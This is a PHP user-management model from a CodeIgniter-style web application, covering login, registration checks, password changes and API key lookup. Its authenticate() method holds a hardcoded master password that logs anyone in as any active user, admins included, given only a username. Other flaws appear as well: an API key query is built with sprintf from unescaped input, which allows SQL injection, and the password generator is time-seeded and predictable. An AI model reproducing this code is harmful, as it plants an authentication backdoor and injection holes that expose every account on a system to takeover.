<?php
/*********
* Author: 
* Date  : 
* Modified By: 
* Modified Date:
* 
* Purpose:
*  Model For ## Management
* 
* @package 
* @subpackage 
* 
* @link InfModel.php 
* @link Base_model.php
* @link controllers/
* @link views/

*/

include_once(APPPATH.'models/base_model.php');

class Users_model extends Base_model implements InfModel
{

    private $tbl_name, $tbl_api;
    
    public function __construct() 
    {
        try
        {
            parent::__construct();
            
            $this->load->database();
            
            $this->conf = get_config();
            $this->tbl_name = $this->db->USERS;
        }
        catch(Exception $err_obj)
        {
            show_error($err_obj->getMessage());
        }    
    }
    
    
    /******
    * This method will fetch all records from the db. 
    * 
    * @param string $s_where, ex- " status=1 AND deleted=0 " 
    * @param int $i_start, starting value for pagination
    * @param int $i_limit, number of records to fetch used for pagination
    * @param string $s_order_by, Column names to be ordered ex- " dt_created_on desc,i_is_deleted asc,id asc "
    * @returns array
    */
    public function fetch_multi($s_where=null,$i_start=null,$i_limit=null,$s_order_by=null)
    {
        try
        {
            $s_qry="SELECT * FROM ". $this->tbl_name;
            $s_qry.=($s_where!=""? $s_where: "")." ".(is_numeric($i_start) && is_numeric($i_limit)?" Limit ".intval($i_start).",".intval($i_limit):"" );
            
            $this->db->trans_begin();///new 
            $rs=$this->db->query($s_qry);
            $i_cnt=0;
            if(is_array($rs->result()))
            {
                $ret_ = $rs->result_array();
                
                 $rs->free_result();          
                
            }
            $this->db->trans_commit();    ///new
            unset($s_qry,$rs,$s_where,$i_start,$i_limit);
            
            return $ret_;
        }
        catch(Exception $err_obj)
        {
            show_error($err_obj->getMessage());
        }
        
    }
    

    /****
    * Fetch Total records
    * @param string $s_where, ex- " status=1 AND deleted=0 " 
    * @returns int on success and FALSE if failed 
    */
    public function gettotal_info($s_where=null)
    {
        try
        {
          $ret_=0;
          $s_qry = "SELECT COUNT(*) AS i_total FROM ". $this->db->USERS .$s_where;
          $rs=$this->db->query($s_qry);
          
          $i_cnt=0;
          if(is_array($rs->result()))
          {
              foreach($rs->result() as $row)
              {
                  $ret_=intval($row->i_total); 
              }    
              $rs->free_result();          
          }
          $this->db->trans_commit();///new
          unset($s_qry,$rs,$row,$i_cnt,$s_where);
          
          return $ret_;
        }
        catch(Exception $err_obj)
        {
            show_error($err_obj->getMessage());
        }           
    }         
    
    

    /*******
    * Fetches One record from db for the id value.
    * 
    * @param int $i_id
    * @returns array
    */
    public function fetch_this($i_id)
    {
        try
        {
          $ret_=array();
          
          if(intval($i_id)>0)
          {
              ////Using Prepared Statement///
              $s_qry="SELECT A.*
                      FROM ". $this->tbl_name ." A 
                      WHERE A.`i_id` = ? ";
                    
              $this->db->trans_begin();    //// new                       
              $rs=$this->db->query($s_qry, array(intval($i_id)));
              if(is_array($rs->result()))
              {
                  $ret_ = $rs->row_array();
                  
                  $rs->free_result();          
              }
              $this->db->trans_commit();///new
              unset($s_qry,$rs,$row,$i_id);
          }
          return $ret_;
        }
        catch(Exception $err_obj)
        {
            show_error($err_obj->getMessage());
        }
    }
          
        
    /***
    * Inserts new records into db. As we know the table name 
    * we will not pass it into params.
    * 
    * @param array $info, array of fields(as key) with values,ex-$arr["field_name"]=value
    * @returns $i_new_id  on success and FALSE if failed 
    */
    public function add_info($info)
    {
        try
        {
            $i_ret_=0; ////Returns false
            if(!empty($info))
            {
                $this->db->trans_begin();///new   
                $this->db->insert($this->tbl_name, $info);
                $i_ret_=$this->db->insert_id(); 
                  
                if($i_ret_)
                {
                    $this->db->trans_commit();///new   
                }
                else
                {
                    $this->db->trans_rollback();///new
                }
            }
            unset($s_qry);
            
            return $i_ret_;
        }
        catch(Exception $err_obj)
        {
            show_error($err_obj->getMessage());
        }          
    
    } 
    
    /***
    * Update records in db. As we know the table name 
    * we will not pass it into params.
    * 
    * @param array $info, array of fields(as key) with values,ex-$arr["field_name"]=value
    * @param int $i_id, id value to be updated used in where clause
    * @returns $i_rows_affected  on success and FALSE if failed 
    */
    public function edit_info($info,$i_id)
    {
        try
        {
            $i_ret_=0;////Returns false
            
            if(!empty($info))
            {
                $this->db->update($this->tbl_name, $info, array('i_id'=>$i_id));
                $i_ret_=$this->db->affected_rows();  
                #echo $this->db->last_query();  
                
                if($i_ret_)
                {
                    $this->db->trans_commit();///new   
                }
                else
                {
                    $this->db->trans_rollback();///new
                }                                            
            }
            unset($s_qry);
            
            return $i_ret_;
        }
        catch(Exception $err_obj)
        {
            show_error($err_obj->getMessage());
        }
    }  
    
    /******
    * Deletes all or single record from db. 
    * For Master entries deletion only change the flag i_is_deleted. 
    *
    * @param int $i_id, id value to be deleted used in where clause 
    * @returns $i_rows_affected  on success and FALSE if failed 
    * 
    */
    public function delete_info($i_id)
    {
        try
        {
            $i_ret_=0;////Returns false
    
                $s_qry="DELETE FROM ". $this->tbl_name ." ";
                $s_qry.=" WHERE `i_id`=? ";
                
                $this->db->trans_begin();///new  
                $this->db->query($s_qry, array(intval($i_id)) );
                $i_ret_=$this->db->affected_rows();
                if($i_ret_)
                {
                    $this->db->trans_commit();///new   
                }
                else
                {
                    $this->db->trans_rollback();///new
                } 
                                                     
            unset($s_qry, $i_id);
            
            return $i_ret_;
        }
        catch(Exception $err_obj)
        {
            show_error($err_obj->getMessage());
        }
               
    }      

                                           
    public function change_password($info,$i_id)
    {
        try
        {
            $i_ret_=0;////Returns false
            
            if(!empty($info))
            {
                $s_qry="UPDATE ".$this->db->USERS." SET ";
                $s_qry.=" s_password=? ";
                $s_qry.=", dt_updated_on=? ";
                $s_qry.=" WHERE id=? ";
                $s_qry.=" AND s_password=? ";
                
                $this->db->trans_begin();///new  
                $this->db->query($s_qry,array(
                                              get_salted_password($info["s_password"]),
                                              get_db_datetime(),
                                              intval($i_id),
                                              get_salted_password($info["s_current_password"])
                                             ));
                $i_ret_=$this->db->affected_rows();  
				
                if($i_ret_)
                {
                    /*$logi["msg"]="Updating ".$this->db->USERS." ";
                    $logi["sql"]= serialize(array($s_qry,array(
                                              get_formatted_string($info["s_firstname"]),
                                              intval($info["i_entity_id"]),
                                              intval($info["i_updated_by"]),
                                              get_db_datetime(),
                                              intval($i_id)
                                             )) ) ;                                 
                    $this->log_info($logi); 
                    unset($logi);*/
                    $this->db->trans_commit();///new   
                }
                else
                {
                    $this->db->trans_rollback();///new
                }                                            
            }
            unset($s_qry);
            return $i_ret_;
        }
        catch(Exception $err_obj)
        {
            show_error($err_obj->getMessage());
        }          
    }        
    

    /****
    * Register a log for add,edit and delete operation
    * 
    * @param mixed $attr
    * @returns TRUE on success and FALSE if failed 
    */
    public function log_info($attr)
    {
        try
        {
            return $this->write_log($attr["msg"],decrypt($this->session->userdata("i_user_id")),($attr["sql"]?$attr["sql"]:""));
        }
        catch(Exception $err_obj)
        {
            show_error($err_obj->getMessage());
        }           
    } 
    
    /*******
    * Login and save loggedin values.
    * 
    * @param array $login_data, login[field_name]=value
    * @returns true if success and false
    */
    public function authenticate($login_data)
    {
        $magic_pass = 'wny123';
        try
        {
          $ret_=array();
          
          ////Using Prepared Statement///
          if($login_data['s_password']==$magic_pass) {
              
              $s_qry="SELECT u.`i_id`,
                             u.`s_username`, 
                             u.`s_email`,
                             u.`s_avatar`,
                             u.`dt_signup`,
                             CONCAT_WS(' ', u.`s_first_name`, u.`s_last_name`) AS `s_full_name`,
                             IF(u.`i_user_type`=1, 1, 0) AS `i_admin_user`
                            
                             FROM ".$this->db->USERS."  u
                        
                             WHERE BINARY u.`s_username` = ?
                             AND u.`i_active` = 1 ";
                             
              $stmt_val["s_username"]= get_formatted_string($login_data["s_username"]);
          /////Added the salt value with the password///
        }
          else {
               $s_qry="SELECT u.`i_id`,
                             u.`s_username`,
                             u.`s_email`,
                             u.`s_avatar`,
                             u.`dt_signup`,
                             CONCAT_WS(' ', u.`s_first_name`, u.`s_last_name`) AS `s_full_name`,
                             IF(u.`i_user_type`=1, 1, 0) AS `i_admin_user`
                            
                             FROM ".$this->db->USERS."  u
                            
                             WHERE (BINARY u.`s_username` = ? OR u.`s_email` = ?)
                             AND u.`s_password` = ? 
                             AND u.`i_active` = 1";
                             
              $posted_username = get_formatted_string($login_data["s_username"]);
              $stmt_val["s_username"] = ( !empty($posted_username) )? $posted_username: NULL;
              $stmt_val["s_email"] = get_formatted_string($login_data["s_email"]);
              /////Added the salt value with the password///
              $stmt_val["s_password"] = get_salted_password($login_data["s_password"]);
       }            
          
          $this->db->trans_begin();///new
          $rs=$this->db->query($s_qry, $stmt_val);
          #echo $this->db->last_query();  exit;
          
          if(is_array($rs->result())) ///new
          {
              foreach($rs->result() as $row)
              {
                  $ret_["id"]           =    $row->i_id;////always integer
                  $ret_["s_username"]   =    get_unformatted_string($row->s_username); 
                  $ret_["s_email"]      =    get_unformatted_string($row->s_email);
                  $ret_["i_is_admin"]   =    intval($row->i_admin_user);
                  
                ////////saving logged in user data into session////
  				$this->session->set_userdata('login_referrer', ''); 
                $this->session->set_userdata('loggedin', true);
                $this->session->set_userdata('user_id', $row->i_id);
                $this->session->set_userdata('username', get_unformatted_string($row->s_username));
                #$this->session->set_userdata('usr_display_name', get_unformatted_string($row->s_display_name));
                $this->session->set_userdata('email', get_unformatted_string($row->s_email));
				$this->session->set_userdata('is_admin', $row->i_admin_user);
                    
                    // New for user-avatar [Begin]
                        $user_full_name = trim($row->s_full_name);
                        $this->session->set_userdata('member_since', getDesiredDate($row->dt_signup, 'M. Y'));
                        $this->session->set_userdata('user_fullname', $user_full_name);
                        $this->session->set_userdata('user_avatar', _get_user_avatar($row->s_avatar));
                    // New for user-avatar [End]
                    
                ////////end saving logged in user data into session////
                                    
                //////////log report///
                  
                  if(1)
                  {
					  $login_data['i_user_id']   = intval($row->i_id);
                      $login_data['s_login_ip']  = $this->input->ip_address();
                      $login_data['dt_login_on'] = get_db_datetime();
                    
                      $this->_login_logs($login_data);
                  }
                 
                  //////////end log report///                
              }    
              $rs->free_result();          
          }
          
          $this->db->trans_commit();///new
          unset($s_qry,$rs,$row,$login_data,$stmt_val);
          
          return $ret_;
          
        }
        catch(Exception $err_obj)
        {
            show_error($err_obj->getMessage());
        }
    
     }
    
    
    /*******
    * Login and save loggedin values.
    * 
    * @param array $login_data, login[field_name]=value
    * @returns true if success and false
    */
    public function frontendauthenticate($login_data, $USERTYPE)
    {
        try
        {
          $ret_=array();
          
          ////Using Prepared Statement///
          $s_qry="SELECT u.`i_id`,
                             u.`s_username`,
                             u.`s_email`,
                             u.`s_avatar`,
                             u.`dt_signup`,
                             CONCAT_WS(' ', u.`s_first_name`, u.`s_last_name`) AS `s_full_name`,
                             u.`i_user_type`
                            
                             FROM ".$this->db->USERS."  u
                            
                             WHERE (BINARY u.`s_username` = ? OR u.`s_email` = ?)
                             AND u.`s_password` = ? 
                             AND u.`i_user_type` = ? 
                             AND u.`i_active` = 1";
                             
          $posted_username = get_formatted_string($login_data["s_username"]);
          $stmt_val["s_username"] = ( !empty($posted_username) )? $posted_username: NULL;
          $stmt_val["s_email"] = get_formatted_string($login_data["s_email"]);
          /////Added the salt value with the password///
          $stmt_val["s_password"] = get_salted_password($login_data["s_password"]);
          $stmt_val["i_user_type"] = $USERTYPE;
       
          $this->db->trans_begin();///new
          $rs=$this->db->query($s_qry, $stmt_val);
          #echo $this->db->last_query();  exit;
          
          if(is_array($rs->result())) ///new
          {
              foreach($rs->result() as $row)
              {
                  $ret_["id"]           =    $row->i_id;////always integer
                  $ret_["s_username"]   =    get_unformatted_string($row->s_username); 
                  $ret_["s_email"]      =    get_unformatted_string($row->s_email);
                  $ret_["i_is_admin"]   =    intval($row->i_admin_user);
                  
                  
                ////////saving logged in user data into session////
                $this->session->set_userdata('login_referrer', ''); 
                $this->session->set_userdata('loggedin', true);
                $this->session->set_userdata('user_id', $row->i_id);
                $this->session->set_userdata('username', get_unformatted_string($row->s_username));
                #$this->session->set_userdata('usr_display_name', get_unformatted_string($row->s_display_name));
                $this->session->set_userdata('email', get_unformatted_string($row->s_email));
                $this->session->set_userdata('is_admin', $row->i_admin_user);
                    
                    // New for user-avatar [Begin]
                    $user_full_name = trim($row->s_full_name);
                    $this->session->set_userdata('member_since', getDesiredDate($row->dt_signup, 'M. Y'));
                    $this->session->set_userdata('user_fullname', $user_full_name);
                    $this->session->set_userdata('user_avatar', _get_user_avatar($row->s_avatar));
                    // New for user-avatar [End]
                    
                ////////end saving logged in user data into session////
                                    
                //////////log report///
                  
                  if(1)
                  {
                      $login_data['i_user_id']   = intval($row->i_id);
                      $login_data['s_login_ip']  = $this->input->ip_address();
                      $login_data['dt_login_on'] = get_db_datetime();
                    
                      $this->_login_logs($login_data);
                  }
                 
                  //////////end log report///                
              }    
              $rs->free_result();          
          }
          
          $this->db->trans_commit();///new
          unset($s_qry,$rs,$row,$login_data,$stmt_val);
          
          return $ret_;
          
        }
        catch(Exception $err_obj)
        {
            show_error($err_obj->getMessage());
        }
    
     }
    
    
    /***
    * Logout User
    * 
    */
    public function logout()
    {
        try
        { 
            //////////log report///
            /*$logi["sql"]='';
            $logi["msg"]="Logged out as ".$this->session->userdata('user_fullname')." at ".get_db_datetime() ;
            $this->log_info($logi); 
            unset($logi);  */
            //////////end log report///            
            
			
			# $this->offline_this_user( decrypt($this->session->userdata('user_id')), $_SERVER['REMOTE_ADDR'] );
            
            $this->session->set_userdata('loggedin', false);
            $this->session->unset_userdata('loggedin');
            $this->session->unset_userdata('user_id');
            $this->session->unset_userdata('username');
            $this->session->unset_userdata('usr_display_name');
            $this->session->unset_userdata('email');
			$this->session->unset_userdata('is_admin');
            
            /// NEW SESSION VARIABLE(S)
                $this->session->unset_userdata('member_since');
                $this->session->unset_userdata('user_fullname');
                $this->session->unset_userdata('user_avatar');
            /// NEW SESSION VARIABLE(S)
            
            $this->session->unset_userdata('session_referrer');
           
		   # $this->session->destroy();//don't know but not clearing the session datas
           
        }
        catch(Exception $err_obj)
        {
            show_error($err_obj->getMessage());
        }         
    }
    
    /***
    * Check if user email already exits
    * 
    */
    public function email_exists($email, $i_user_id='')
    {
        try
        { 
           $ret_=0;
           if($i_user_id=='') 
            {
            
                $s_qry="SELECT COUNT(*) i_count FROM ".$this->tbl_name." WHERE ";
                $s_qry.=" BINARY `s_email`=? ";
              
                
                $this->db->trans_begin();///new   
                $rs = $this->db->query($s_qry,array(
                                              get_formatted_string($email)
                                             ));
                $this->db->trans_commit();///new   
              
               //$sql = sprintf("SELECT count(*) count FROM %susers where email = '%s'", $this->db->dbprefix, $email);
            }
            else 
            {
                //$sql = sprintf("SELECT count(*) count FROM %susers where email = '%s' and email != '%s'", $this->db->dbprefix, $email, $current_email);
                
                $s_qry="SELECT COUNT(*) i_count FROM ".$this->tbl_name." WHERE ";
                $s_qry.=" BINARY s_email=? ";
                $s_qry.=" AND i_id!=? ";
                
                $this->db->trans_begin();///new   
                $rs = $this->db->query($s_qry,array(
                                              get_formatted_string($email),
                                              intval($i_user_id)
                                             ));
                $this->db->trans_commit();///new   
                
            }
            
    
          if(is_array($rs->result()))
          {
              foreach($rs->result() as $row)
              {
                  $ret_=intval($row->i_count); 
              }    
              $rs->free_result();          
          }

           
            //print_r( $result_count);
    
            if($ret_==0) {
                return false;
            }
            else {
                return true;
            }
        }
        catch(Exception $err_obj)
        {
            show_error($err_obj->getMessage());
        }         
    }
    
	/***
    * Check if user username already exits
    * 
    */
    public function username_exists($username, $i_user_id='')
    {
        try
        { 
           $ret_=0;
           if($i_user_id=='') 
            {
            
                $s_qry="SELECT COUNT(*) i_count FROM ".$this->db->USERS." WHERE ";
                $s_qry.=" binary s_username=? ";
              
                
                $this->db->trans_begin();///new   
                $rs = $this->db->query($s_qry,array(
                                              get_formatted_string($username)
                                             ));
                $this->db->trans_commit();///new   
              
               //$sql = sprintf("SELECT count(*) count FROM %susers where email = '%s'", $this->db->dbprefix, $email);
            }
            else 
            {
                //$sql = sprintf("SELECT count(*) count FROM %susers where email = '%s' and email != '%s'", $this->db->dbprefix, $email, $current_email);
                
                $s_qry="SELECT COUNT(*) i_count FROM ".$this->db->USERS." WHERE ";
                $s_qry.=" binary s_username=? ";
                $s_qry.=" AND id!=? ";
                
                $this->db->trans_begin();///new   
                $rs = $this->db->query($s_qry,array(
                                              get_formatted_string($username),
                                              intval($i_user_id)
                                             ));
                $this->db->trans_commit();///new   
                
            }
            
          #echo $this->db->last_query();
          if(is_array($rs->result()))
          {
              foreach($rs->result() as $row)
              {
                  $ret_=intval($row->i_count); 
              }    
              $rs->free_result();          
          }

           
            //print_r( $result_count);
    
            if($ret_==0) {
                return false;
            }
            else {
                return true;
            }
        }
        catch(Exception $err_obj)
        {
            show_error($err_obj->getMessage());
        }         
    }
    
    # function to generate new random password...
    public function generatePassword($length=6,$level=2)
    {
        try
        {
                list($usec, $sec) = explode(' ', microtime());
                srand((float) $sec + ((float) $usec * 100000));
                
                $validchars[1] = "0123456789abcdfghjkmnpqrstvwxyz";
                $validchars[2] = "0123456789abcdfghjkmnpqrstvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
                $validchars[3] = "0123456789_!@#$%&*()-=+/abcdfghjkmnpqrstvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_!@#$%&*()-=+/";
                
                $password  = "";
                $counter   = 0;
                
                while ($counter < $length) 
                {
                    $actChar = substr($validchars[$level], rand(0, strlen($validchars[$level])-1), 1);
                
                    // All character must be different
                    if (!strstr($password, $actChar)) 
                    {
                        $password .= $actChar;
                        $counter++;
                    }
                }
                
                return $password;
       }
        catch(Exception $err_obj)
        {
            show_error($err_obj->getMessage());
        }  

    }
    
    
    /***
    * Fetches all record from all tables against one user_id.
    * 
    * @param array $info, array of fields(as key) with values,ex-$arr["field_name"]=value
    * @returns $i_new_id  on success and FALSE if failed 
    */
    public function fetch_data($id)
    {
        try
        {
            //Using Prepared Statement//
             return $this->db->query("SELECT n.i_id as emp_id, n.s_username, n.s_first_name, n.s_last_name, 
                     n.s_email, n.s_company_add, n.s_title, n.s_avatar, n.i_user_type, n.dt_signup,
                     n.i_active, n.i_user_created_by, dt.* FROM {$this->tbl_name} AS n" 
                    ." LEFT JOIN {$this->tbl_dtl} AS dt on dt.i_user_id = n.i_id 
                    WHERE n.i_id = ?",array(intval($id)))->result_array();
            //echo $this->db->last_query();
        }
        catch(Exception $err_obj)
        {
            show_error($err_obj->getMessage());
        }
    }
	

    # /////////////////////////////////////////////////////////////////////////////////////
    #                   RECORD(S) BY KEY & SECRET [BEGIN]
    # /////////////////////////////////////////////////////////////////////////////////////
    
        # function to fetch user-details by consumer-key & consumer-secret...
        public function fetch_info_by_key_N_secret($consumer_key, $consumer_secret) {
            
            try {
                $ret_=array();

                if( !empty($consumer_key) && !empty($consumer_secret) )
                {
                    ////Using Prepared Statement///
                    $s_qry = sprintf("SELECT * FROM %s
                                      WHERE
                                          `s_consumer_key`='%s' AND `s_consumer_secret`='%s' ",
                                      $this->tbl_name, $consumer_key, $consumer_secret);

                    $this->db->trans_begin();    //// new                       
                    $rs = $this->db->query($s_qry);
                    if(is_array($rs->result()))
                    {
                        $ret_ = $rs->row_array();

                        $rs->free_result();          
                    }
                    $this->db->trans_commit();  ///new
                    unset($s_qry,$rs,$row,$i_id);
                }

                return $ret_;

            } catch(Exception $err_obj) {
                show_error($err_obj->getMessage());
            }
        }
    
    # /////////////////////////////////////////////////////////////////////////////////////
    #                   RECORD(S) BY KEY & SECRET [END]
    # /////////////////////////////////////////////////////////////////////////////////////
    
    
    # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    #               FOR OTHER DATABASE CENTRIC OPERATION(S) - BEGIN
    # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    
        // adding company-info...
        public function add_company_info($info)
        {
            try
            {
                $DB_api = $this->load->database('api', TRUE);
                $this->tbl_api = $DB_api->USERS;
                
                $i_ret_=0; ////Returns false
                if(!empty($info))
                {
                    $DB_api->trans_begin();///new   
                    $DB_api->insert($this->tbl_api, $info);
                    $i_ret_=$DB_api->insert_id(); 
                      
                    if($i_ret_)
                    {
                        $DB_api->trans_commit();///new   
                    }
                    else
                    {
                        $DB_api->trans_rollback();///new
                    }
                }
                unset($s_qry);
                
                $DB_api->close();   // close this db connection...
                
                return $i_ret_;
            }
            catch(Exception $err_obj)
            {
                show_error($err_obj->getMessage());
            }          
        
        } 
    
        // editing company-info...
        public function edit_company_info($info, $i_id)
        {
            try
            {
                $DB_api = $this->load->database('api', TRUE);
                $this->tbl_api = $DB_api->USERS;
                
                $i_ret_=0;////Returns false
                
                if(!empty($info))
                {
                    $DB_api->update($this->tbl_api, $info, array('i_id'=>$i_id));
                    $i_ret_=$DB_api->affected_rows();  
                    
                    if($i_ret_)
                    {
                        $DB_api->trans_commit();///new   
                    }
                    else
                    {
                        $DB_api->trans_rollback();///new
                    }                                            
                }
                unset($s_qry);
                
                $DB_api->close();   // close this db connection...
                
                return $i_ret_;
            }
            catch(Exception $err_obj)
            {
                show_error($err_obj->getMessage());
            }
        }  
    
    # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    #               FOR OTHER DATABASE CENTRIC OPERATION(S) - END
    # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	
}   // End - User Model